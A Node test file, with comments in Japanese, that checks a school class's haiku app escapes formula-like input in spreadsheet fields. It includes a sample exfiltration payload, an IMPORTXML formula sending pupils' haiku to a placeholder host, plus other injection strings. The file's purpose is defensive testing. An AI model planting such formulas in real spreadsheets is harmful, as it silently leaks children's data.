/**
 * 児童が書いた文字が、先生の表計算ファイルの中で「数式」として動き出さないかを確かめる。
 *
 * ■ 何が起きうるか
 *   Google スプレッドシートは、= + - @ で始まる文字列を数式として保存する。
 *   上の句に =IMPORTXML("https://example.com/?"&俳句!D2,"//x") と書いて投稿されると、
 *   先生がその表計算ファイルを開いた瞬間に、学級の句が外のサーバーへ送られる。
 *   児童の画面にも先生の画面にも合図は出ない。
 *
 * ■ この検査の作り
 *   code.gs をそのまま Node で動かし、GAS のサービスは最小限の代役に差し替える。
 *   代役のシートは、本番の表計算と同じように **書き込まれた生の値**と
 *   **読み戻したときの値**を区別して持つ（先頭の ' は書き込みには残り、
 *   読み戻すと消える）。ここを同じにしてしまうと、
 *   「' を付けたせいで本人判定が壊れる」という壊れ方を見落とす。
 */
import { readFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import vm from 'node:vm';

const src = readFileSync(new URL('../code.gs', import.meta.url), 'utf8');

/* --------------------------------------------------------------- 代役 */
const rawRows = {};   // 書き込まれたそのまま（' を含む）
const sheetRows = {}; // 読み戻したときの姿（先頭の ' は落ちる）

const reset = () => {
  const head = {
    '設定':   [['お題', '投票状況'], ['夏の思い出', '投票受付中']],
    '俳句':   [['ID','名前','投稿日時','俳句','上の句','中の句','下の句','得点','公開名','ミュート','投稿者ID']],
    'コメント': [['投稿日時','俳句ID','コメント投稿者','コメント']],
    '投票':   [['投票日時','俳句ID','点数','投票者ID']],
  };
  for (const k of Object.keys(rawRows)) delete rawRows[k];
  for (const k of Object.keys(sheetRows)) delete sheetRows[k];
  for (const [k, v] of Object.entries(head)) {
    rawRows[k] = v.map(r => r.slice());
    sheetRows[k] = v.map(r => r.slice());
  }
};

// 表計算に保存されたあと、getValue() で読み戻したときの値。
// 先頭の ' は「これは文字です」という印なので、値としては返ってこない。
const asStored = (v) => (typeof v === 'string' && v.startsWith("'") ? v.slice(1) : v);

const mkSheet = (name) => ({
  getName: () => name,
  getDataRange: () => ({ getValues: () => sheetRows[name] }),
  getRange: (a1) => {
    const m = /^([A-K])(\d+)/.exec(String(a1) || 'A1');
    const col = m ? m[1].charCodeAt(0) - 65 : 0;
    const row = m ? Number(m[2]) - 1 : 0;
    return {
      getValue: () => sheetRows[name]?.[row]?.[col] ?? '',
      setValue: (v) => {
        (rawRows[name][row] ||= [])[col] = v;
        (sheetRows[name][row] ||= [])[col] = asStored(v);
      },
      getValues: () => [], setValues: () => {}, clearContent: () => {}, setBackground: () => {},
    };
  },
  getLastRow: () => (sheetRows[name] || []).length,
  appendRow: (r) => { rawRows[name].push(r.slice()); sheetRows[name].push(r.map(asStored)); },
  setName: () => {},
});

const ss = {
  getSheetByName: (n) => (sheetRows[n] ? mkSheet(n) : null),
  getSheets: () => Object.keys(sheetRows).map(mkSheet),
  insertSheet: (n) => { rawRows[n] = [[]]; sheetRows[n] = [[]]; return mkSheet(n); },
  getSpreadsheetTimeZone: () => 'Asia/Tokyo',
  getId: () => 'db1',
};

const cache = new Map();
const props = new Map([['DB_SPREADSHEET_ID', 'db1']]);
let uuid = 0;
const sandbox = {
  console,
  PropertiesService: { getScriptProperties: () => ({
    getProperty: k => props.get(k) ?? null,
    setProperty: (k, v) => props.set(k, v),
    deleteProperty: k => props.delete(k),
  }) },
  CacheService: { getScriptCache: () => ({ put: (k, v) => cache.set(k, v), get: k => cache.get(k) ?? null }) },
  Utilities: {
    getUuid: () => 'uuid-' + (++uuid),
    sleep: () => {},
    formatDate: () => '2026-08-22_10-00',
    DigestAlgorithm: { SHA_256: 'SHA_256' },
    Charset: { UTF_8: 'UTF-8' },
    computeDigest: (_alg, value) => [...createHash('sha256').update(String(value), 'utf8').digest()]
      .map(b => (b > 127 ? b - 256 : b)),
  },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  SpreadsheetApp: { create: () => ss, openById: () => ss },
  HtmlService: {
    createHtmlOutputFromFile: () => ({ getContent: () => '' }),
    createTemplateFromFile: () => ({ evaluate: () => ({ setTitle() { return this; }, addMetaTag() { return this; }, setFaviconUrl() { return this; } }) }),
  },
};
reset();
vm.createContext(sandbox);
vm.runInContext(src, sandbox);

/* --------------------------------------------------------------- 道具 */
let ng = 0;
const ok = (cond, label, detail) => {
  console.log(`  ${cond ? '✅' : '❌'} ${label}${detail === undefined ? '' : ' … ' + JSON.stringify(detail)}`);
  if (!cond) ng++;
};
const isText = (v) => typeof v === 'string' && v.startsWith("'");

// 表計算が数式として読む書き出しかた。全部そろえて試す。
const ATTACKS = [
  ['= で始まる', '=IMPORTXML("https://example.com/?"&俳句!D2,"//x")'],
  ['+ で始まる', '+1+1'],
  ['- で始まる', '-1+1'],
  ['@ で始まる', '@SUM(A1:A9)'],
  ['タブで始まる', '\t=1+1'],
  ['改行で始まる', '\n=1+1'],
];

/* --------------------------------------------------------------- 検査 */
console.log('■ 投句の各欄が、数式として保存されないか');
for (const [label, payload] of ATTACKS) {
  reset();
  sandbox.submitHaiku(payload, payload, 'きょうしつ', 'とどきけり', 'voter_a');
  const row = rawRows['俳句'][1];
  ok(isText(row[1]) && isText(row[3]) && isText(row[4]), `${label}（名前・俳句・上の句）`, payload.slice(0, 24));
}

console.log('\n■ ふつうの句に、よけいな印を付けていないか');
reset();
sandbox.submitHaiku('GIGA太郎', 'せみのこえ', 'きょうしつ', 'とどきけり', 'voter_a');
{
  const raw = rawRows['俳句'][1];
  const stored = sheetRows['俳句'][1];
  ok(raw[1] === 'GIGA太郎' && raw[4] === 'せみのこえ', '書き込みはそのまま', [raw[1], raw[4]]);
  ok(stored[3] === 'せみのこえ きょうしつ とどきけり', '広場に出る句も変わらない', stored[3]);
}

console.log('\n■ コメントが、数式として保存されないか');
reset();
sandbox.submitHaiku('GIGA太郎', 'せみのこえ', 'きょうしつ', 'とどきけり', 'voter_a');
sandbox.submitComment(sheetRows['俳句'][1][0], '=1+1', '@channel');
{
  const row = rawRows['コメント'][1];
  ok(isText(row[2]) && isText(row[3]), 'コメントと、書いた人の名前', [row[2], row[3]]);
}

console.log('\n■ 投票者の識別子が、数式として保存されないか');
reset();
sandbox.submitHaiku('GIGA太郎', 'せみのこえ', 'きょうしつ', 'とどきけり', 'voter_a');
{
  const id = sheetRows['俳句'][1][0];
  const evil = '=IMPORTXML("https://example.com/?"&俳句!D2,"//x")';
  sandbox.submitVote(id, 3, evil);
  ok(isText(rawRows['投票'][1][3]), '投票者ID（端末の印は児童の手元にあり、書き換えられる）', rawRows['投票'][1][3].slice(0, 24));

  // ' を付けたせいで「同じ賞は一度だけ」が効かなくなっては困る。
  const again = sandbox.submitVote(id, 3, evil);
  ok(again.success === false, '同じ識別子の2回目は、これまでどおり弾かれる', again.message);
}

console.log('\n■ 無害化しても、自分の作品の突き合わせが壊れないか');
reset();
{
  const evil = '=1+1';
  sandbox.submitHaiku('GIGA太郎', 'せみのこえ', 'きょうしつ', 'とどきけり', evil);
  const mine = sandbox.getMyHaikus(evil);
  ok(Array.isArray(mine) && mine.length === 1, '数式のような識別子でも、自分の句が1つ返る', mine.length);
}

console.log('\n■ お題（先生が入れる文字）が、数式として保存されないか');
reset();
{
  const setup = sandbox.setupAdminPassword('haiku2026');
  sandbox.updateSettings(setup.token, '=1+1', '投票受付中');
  ok(isText(rawRows['設定'][1][0]), 'お題', rawRows['設定'][1][0]);
  ok(sandbox.getSettingsData().theme === '=1+1', '画面に出るお題は、打ったとおりに戻る', sandbox.getSettingsData().theme);
}

console.log(`\n${ng === 0 ? '数式として保存されうる経路は見つからなかった' : `${ng} 件が通ってしまった`}`);
process.exit(ng === 0 ? 0 : 1);
